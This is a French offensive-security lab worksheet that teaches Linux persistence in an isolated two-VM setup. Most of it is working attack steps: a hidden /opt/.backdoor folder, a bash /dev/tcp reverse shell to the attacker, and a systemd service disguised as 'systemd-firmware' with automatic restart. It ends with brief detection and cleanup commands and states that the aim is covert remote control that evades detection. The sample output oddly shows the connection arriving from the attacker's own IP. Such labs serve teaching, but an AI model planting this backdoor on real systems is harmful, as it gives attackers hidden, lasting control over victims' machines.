
# **TP Offensif – Persistance `systemd` avec Reverse Shell (2 machines)**

**Cours : Cybersécurité Offensive – Exploitation de services Linux pour la persistance**

---

## **Résumé pédagogique**

* Vous jouez le rôle de l’attaquant (sur Kali Linux)
* Vous compromettez une machine Ubuntu 22.04
* Vous créez un **faux service systemd** sur la victime
* Ce service exécute un script Bash qui établit un **reverse shell vers Kali**
* À chaque redémarrage, **la connexion revient automatiquement**

---

## **Prérequis du laboratoire**

### Machines virtuelles

| Rôle      | OS           | IP            | Exemple             |
| --------- | ------------ | ------------- | ------------------- |
| Attaquant | Kali Linux   | 192.168.56.10 | Interface Host-Only |
| Victime   | Ubuntu 22.04 | 192.168.56.11 | Interface Host-Only |

### Réseau

* Type : **Host-only adapter** (VirtualBox / VMware)
* Sans accès Internet
* Les deux VMs doivent pouvoir **se pinguer**

---

## **Schéma ASCII**

```
+------------------------------+             +------------------------------+
| Ubuntu 22.04 (Victime)       |             | Kali Linux (Attaquant)       |
|------------------------------|             |------------------------------|
| systemd -> reverse.sh        | --------->  | nc -lvnp 4444                |
| ExecStart = bash -> Kali     |             | Shell root reçu              |
|                              |             |                               |
+------------------------------+             +------------------------------+
```

---

## **Sur la machine Kali (attaquant)**

### Étape 1 – Écouter sur le port TCP 4444

```bash
nc -lvnp 4444
```

> Laissez ce terminal **ouvert et en attente** de connexion.

---

## **Sur la machine Ubuntu 22.04 (victime)**

Supposons que l’attaquant a obtenu l’accès root (via faille, vulnérabilité, ou escalade).

---

### Étape 2 – Créer le script de reverse shell

1. Créer un dossier discret :

```bash
sudo mkdir -p /opt/.backdoor
```

2. Créer le fichier :

```bash
sudo nano /opt/.backdoor/reverse.sh
```

3. Coller ce contenu (modifiez l’IP si besoin) :

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

4. Rendez le script exécutable :

```bash
sudo chmod +x /opt/.backdoor/reverse.sh
```

---

### Étape 3 – Créer le faux service systemd

1. Créer un fichier `.service` :

```bash
sudo nano /etc/systemd/system/systemd-firmware.service
```

2. Coller le contenu suivant :

```ini
[Unit]
Description=Firmware Daemon Service
After=network.target

[Service]
ExecStart=/opt/.backdoor/reverse.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

### Étape 4 – Activer le service au démarrage

```bash
sudo systemctl daemon-reload
sudo systemctl enable systemd-firmware
sudo systemctl start systemd-firmware
```

---

## **Retour sur Kali**

Le shell arrive automatiquement :

```
Connection received on 192.168.56.10
bash-5.1$ whoami
root
```

---

### Étape 5 – Tester la persistance

1. Sur Ubuntu :

```bash
sudo reboot
```

2. Sur Kali :
   Relancer la commande :

```bash
nc -lvnp 4444
```

> Dans quelques secondes, le shell revient **sans aucune action de l'utilisateur**.

---

## **Détection et analyse côté victime (Blue Team)**

1. Afficher le service :

```bash
systemctl status systemd-firmware
```

2. Lire le journal :

```bash
journalctl -u systemd-firmware
```

3. Voir les fichiers :

```bash
cat /etc/systemd/system/systemd-firmware.service
ls -la /opt/.backdoor/
```

---

## **Suppression complète (désinfection)**

```bash
sudo systemctl stop systemd-firmware
sudo systemctl disable systemd-firmware
sudo rm /etc/systemd/system/systemd-firmware.service
sudo rm -rf /opt/.backdoor/
sudo systemctl daemon-reload
```

Vérifiez :

```bash
systemctl list-units --type=service | grep firmware
```

---

## **À quoi sert cette attaque ?**

Elle permet à un attaquant de :

* **Persister après compromission**
* **Exécuter du code automatiquement après redémarrage**
* **Éviter les outils de détection** classiques
* **Contrôler la victime à distance en toute discrétion**


